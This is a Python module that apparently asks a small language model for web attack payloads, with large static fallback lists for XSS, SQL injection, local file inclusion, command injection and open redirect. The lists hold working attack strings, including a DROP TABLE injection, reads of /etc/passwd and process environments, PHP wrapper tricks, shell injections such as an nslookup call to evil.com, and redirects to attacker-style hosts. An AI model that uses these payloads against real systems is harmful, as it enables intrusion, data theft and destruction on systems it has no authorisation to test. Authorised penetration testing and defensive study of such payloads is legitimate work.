# ai/payload_generator.py
from transformers import pipeline, AutoTokenizer, AutoModelForCausalLM
import torch
import re

class PayloadGenerator:
    def __init__(self):
        # distilgpt2 modelini yükle
        model_name = "distilgpt2"
        self.tokenizer = AutoTokenizer.from_pretrained(model_name)
        self.model = AutoModelForCausalLM.from_pretrained(model_name)
        
        # Pad token eksikse ekle
        if self.tokenizer.pad_token is None:
            self.tokenizer.pad_token = self.tokenizer.eos_token
            
        # Text generation pipeline oluştur
        self.generator = pipeline(
            "text-generation",
            model=self.model,
            tokenizer=self.tokenizer,
            device=0 if torch.cuda.is_available() else -1  # GPU varsa kullan
        )

    def generate_xss_payloads(self, context="", count=10): # Varsayılan count arttı
        """AI ile XSS payload'ları üret"""
        # Daha fazla payload iste
        prompt = f"Generate {count * 2} advanced XSS payloads for penetration testing"
        if context:
            prompt += f" targeting a parameter in {context}"
        prompt += ". List them clearly, one per line, without explanations. Use separators like '###' between payloads if needed:"
        
        try:
            outputs = self.generator(
                prompt,
                max_new_tokens=150, # Arttırıldı
                num_return_sequences=1,
                temperature=0.9, # Arttırıldı
                top_p=0.95, # Arttırıldı
                do_sample=True,
                pad_token_id=self.tokenizer.eos_token_id
            )
            # AI çıktısını işle
            generated_text = outputs[0]['generated_text'].replace(prompt, '').strip()
            
            # Potansiyel ayırıcılarla böl
            # Önce özel ayırıcıları dene
            if '###' in generated_text:
                payloads = [p.strip() for p in generated_text.split('###') if p.strip()]
            elif '---' in generated_text:
                payloads = [p.strip() for p in generated_text.split('---') if p.strip()]
            elif '***' in generated_text:
                payloads = [p.strip() for p in generated_text.split('***') if p.strip()]
            else:
                # Satır sonlarına böl
                payloads = [p.strip() for p in generated_text.split('\n') if p.strip()]
                
            # Temizle: Çok kısa veya sadece sembol içerenleri filtrele
            cleaned_payloads = []
            for p in payloads:
                # Temel temizlik
                p_clean = p.strip('`"\' \t\n\r\x0b\x0c')
                # Uzunluk ve içerik kontrolü
                if len(p_clean) > 3 and re.search(r'[<>a-zA-Z0-9&;:]', p_clean): # En az bir ilgili karakter
                    cleaned_payloads.append(p_clean)
                    
            # Eğer yeterli payload üretilmediyse, statik fallback kullan
            if len(cleaned_payloads) < count:
                print(f"[!] AI sadece {len(cleaned_payloads)} XSS payload üretti. Statik fallback'ler ekleniyor.")
                fallback_needed = count - len(cleaned_payloads)
                cleaned_payloads.extend(self._get_static_xss_payloads(fallback_needed))
                
            return cleaned_payloads[:count]
        except Exception as e:
            print(f"[!] AI XSS payload üretme hatası: {e}")
            return self._get_static_xss_payloads(count)

    def generate_sqli_payloads(self, context="", count=10): # Varsayılan count arttı
        """AI ile SQL Injection payload'ları üret"""
        prompt = f"Generate {count * 2} advanced SQL injection payloads for testing database vulnerabilities"
        if context:
            prompt += f" in a {context} application"
        prompt += ". List them clearly, one per line, without explanations. Use separators like '###' between payloads if needed:"
        
        try:
            outputs = self.generator(
                prompt,
                max_new_tokens=150, # Arttırıldı
                num_return_sequences=1,
                temperature=0.9, # Arttırıldı
                top_p=0.95, # Arttırıldı
                do_sample=True,
                pad_token_id=self.tokenizer.eos_token_id
            )
            generated_text = outputs[0]['generated_text'].replace(prompt, '').strip()
            
            if '###' in generated_text:
                payloads = [p.strip() for p in generated_text.split('###') if p.strip()]
            elif '---' in generated_text:
                payloads = [p.strip() for p in generated_text.split('---') if p.strip()]
            elif '***' in generated_text:
                payloads = [p.strip() for p in generated_text.split('***') if p.strip()]
            else:
                payloads = [p.strip() for p in generated_text.split('\n') if p.strip()]
                
            cleaned_payloads = []
            for p in payloads:
                p_clean = p.strip('`"\' \t\n\r\x0b\x0c')
                if len(p_clean) > 3 and re.search(r'[\'";a-zA-Z0-9\-_]', p_clean):
                    cleaned_payloads.append(p_clean)
                    
            if len(cleaned_payloads) < count:
                print(f"[!] AI sadece {len(cleaned_payloads)} SQLi payload üretti. Statik fallback'ler ekleniyor.")
                fallback_needed = count - len(cleaned_payloads)
                cleaned_payloads.extend(self._get_static_sqli_payloads(fallback_needed))
                
            return cleaned_payloads[:count]
        except Exception as e:
            print(f"[!] AI SQLi payload üretme hatası: {e}")
            return self._get_static_sqli_payloads(count)

    def generate_lfi_payloads(self, context="", count=10): # Varsayılan count arttı
        """AI ile LFI payload'ları üret"""
        prompt = f"Generate {count * 2} advanced Local File Inclusion (LFI) payloads for reading system files"
        if context:
            prompt += f" in a {context} application"
        prompt += ". List them clearly, one per line, without explanations. Use separators like '###' between payloads if needed:"
        
        try:
            outputs = self.generator(
                prompt,
                max_new_tokens=150, # Arttırıldı
                num_return_sequences=1,
                temperature=0.9, # Arttırıldı
                top_p=0.95, # Arttırıldı
                do_sample=True,
                pad_token_id=self.tokenizer.eos_token_id
            )
            generated_text = outputs[0]['generated_text'].replace(prompt, '').strip()
            
            if '###' in generated_text:
                payloads = [p.strip() for p in generated_text.split('###') if p.strip()]
            elif '---' in generated_text:
                payloads = [p.strip() for p in generated_text.split('---') if p.strip()]
            elif '***' in generated_text:
                payloads = [p.strip() for p in generated_text.split('***') if p.strip()]
            else:
                payloads = [p.strip() for p in generated_text.split('\n') if p.strip()]
                
            cleaned_payloads = []
            for p in payloads:
                p_clean = p.strip('`"\' \t\n\r\x0b\x0c')
                if len(p_clean) > 5 and ('/' in p_clean or '\\' in p_clean or 'php://' in p_clean):
                    cleaned_payloads.append(p_clean)
                    
            if len(cleaned_payloads) < count:
                print(f"[!] AI sadece {len(cleaned_payloads)} LFI payload üretti. Statik fallback'ler ekleniyor.")
                fallback_needed = count - len(cleaned_payloads)
                cleaned_payloads.extend(self._get_static_lfi_payloads(fallback_needed))
                
            return cleaned_payloads[:count]
        except Exception as e:
            print(f"[!] AI LFI payload üretme hatası: {e}")
            return self._get_static_lfi_payloads(count)

    def generate_cmd_payloads(self, context="", count=10): # Varsayılan count arttı
        """AI ile Command Injection payload'ları üret"""
        prompt = f"Generate {count * 2} advanced command injection payloads for executing system commands"
        if context:
            prompt += f" in a {context} application"
        prompt += ". List them clearly, one per line, without explanations. Use separators like '###' between payloads if needed:"
        
        try:
            outputs = self.generator(
                prompt,
                max_new_tokens=150, # Arttırıldı
                num_return_sequences=1,
                temperature=0.9, # Arttırıldı
                top_p=0.95, # Arttırıldı
                do_sample=True,
                pad_token_id=self.tokenizer.eos_token_id
            )
            generated_text = outputs[0]['generated_text'].replace(prompt, '').strip()
            
            if '###' in generated_text:
                payloads = [p.strip() for p in generated_text.split('###') if p.strip()]
            elif '---' in generated_text:
                payloads = [p.strip() for p in generated_text.split('---') if p.strip()]
            elif '***' in generated_text:
                payloads = [p.strip() for p in generated_text.split('***') if p.strip()]
            else:
                payloads = [p.strip() for p in generated_text.split('\n') if p.strip()]
                
            cleaned_payloads = []
            for p in payloads:
                p_clean = p.strip('`"\' \t\n\r\x0b\x0c')
                if len(p_clean) > 3 and re.search(r'[;&|$`()]', p_clean): # Komut karakterleri
                    cleaned_payloads.append(p_clean)
                    
            if len(cleaned_payloads) < count:
                print(f"[!] AI sadece {len(cleaned_payloads)} Command Injection payload üretti. Statik fallback'ler ekleniyor.")
                fallback_needed = count - len(cleaned_payloads)
                cleaned_payloads.extend(self._get_static_cmd_payloads(fallback_needed))
                
            return cleaned_payloads[:count]
        except Exception as e:
            print(f"[!] AI Command Injection payload üretme hatası: {e}")
            return self._get_static_cmd_payloads(count)

    def generate_redirect_payloads(self, context="", count=10): # Varsayılan count arttı
        """AI ile Open Redirect payload'ları üret"""
        prompt = f"Generate {count * 2} advanced open redirect payloads to redirect users to malicious sites"
        if context:
            prompt += f" in a {context} application"
        prompt += ". List them clearly, one per line, without explanations. Use separators like '###' between payloads if needed:"
        
        try:
            outputs = self.generator(
                prompt,
                max_new_tokens=150, # Arttırıldı
                num_return_sequences=1,
                temperature=0.9, # Arttırıldı
                top_p=0.95, # Arttırıldı
                do_sample=True,
                pad_token_id=self.tokenizer.eos_token_id
            )
            generated_text = outputs[0]['generated_text'].replace(prompt, '').strip()
            
            if '###' in generated_text:
                payloads = [p.strip() for p in generated_text.split('###') if p.strip()]
            elif '---' in generated_text:
                payloads = [p.strip() for p in generated_text.split('---') if p.strip()]
            elif '***' in generated_text:
                payloads = [p.strip() for p in generated_text.split('***') if p.strip()]
            else:
                payloads = [p.strip() for p in generated_text.split('\n') if p.strip()]
                
            cleaned_payloads = []
            for p in payloads:
                p_clean = p.strip('`"\' \t\n\r\x0b\x0c')
                if len(p_clean) > 10 and ('http' in p_clean or '//' in p_clean):
                    cleaned_payloads.append(p_clean)
                    
            if len(cleaned_payloads) < count:
                print(f"[!] AI sadece {len(cleaned_payloads)} Open Redirect payload üretti. Statik fallback'ler ekleniyor.")
                fallback_needed = count - len(cleaned_payloads)
                cleaned_payloads.extend(self._get_static_redirect_payloads(fallback_needed))
                
            return cleaned_payloads[:count]
        except Exception as e:
            print(f"[!] AI Open Redirect payload üretme hatası: {e}")
            return self._get_static_redirect_payloads(count)

    # --- Genişletilmiş Statik fallback payload'lar ---
    def _get_static_xss_payloads(self, count):
        """Fallback: genişletilmiş statik XSS payload listesi"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
            "<img src=1 onerror=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<svg><script>alert(1)</script></svg>",
            "<math><mtext></mtext></math>",
            "';alert(1);//",
            "\"><svg onload=alert(1)>",
            "JaVaScRiPt:alert(1)",
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            "%3Cscript%3Ealert(1)%3C/script%3E"
        ]
        return payloads[:count]

    def _get_static_sqli_payloads(self, count):
        """Fallback: genişletilmiş statik SQLi payload listesi"""
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM information_schema.tables; --",
            "') OR ('1'='1",
            "1' ORDER BY 1--",
            "' OR 1=1--",
            "' OR '1'='1'/*",
            "' OR '1'='1'#",
            "' OR 1=1#",
            "admin'--",
            "' OR EXISTS(SELECT 1)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT PG_SLEEP(5)--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
            "1' AND ASCII(SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables),1,1)) > 64--"
        ]
        return payloads[:count]

    def _get_static_lfi_payloads(self, count):
        """Fallback: genişletilmiş statik LFI payload listesi"""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "/etc/passwd%00",
            "C:\\boot.ini",
            "....//....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "php://input",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
            "expect://id",
            "zip://shell.jpg%23payload.php",
            "phar://shell.phar/shell.txt",
            "/proc/self/environ",
            "/var/log/apache2/access.log"
        ]
        return payloads[:count]

    def _get_static_cmd_payloads(self, count):
        """Fallback: genişletilmiş statik Command Injection payload listesi"""
        payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "`id`",
            "$(cat /etc/passwd)",
            "; ping -c 3 127.0.0.1",
            "| nslookup evil.com",
            "& net user",
            "; dir",
            "| type C:\\Windows\\win.ini",
            "&& echo OS Injection Successful",
            "|| echo Another Injection",
            "`sleep 10`",
            "$(sleep 10)",
            ";${IFS}id"
        ]
        return payloads[:count]

    def _get_static_redirect_payloads(self, count):
        """Fallback: genişletilmiş statik Open Redirect payload listesi"""
        payloads = [
            "http://evil.com",
            "//evil.com",
            "https://malicious.site",
            "?redirect=http://evil.com",
            "&url=//evil.com",
            "?next=http://evil.com",
            "&goto=//evil.com",
            "///evil.com/",
            "////evil.com/",
            "https://evil.com%5c@legitimate.com", # Backslash trick
            "http://legitimate.com?.evil.com", # Dot trick
            "//https://evil.com",
            "?r=https://evil.com",
            "&dest=//evil.com",
            "javascript:alert(1)"
        ]
        return payloads[:count]
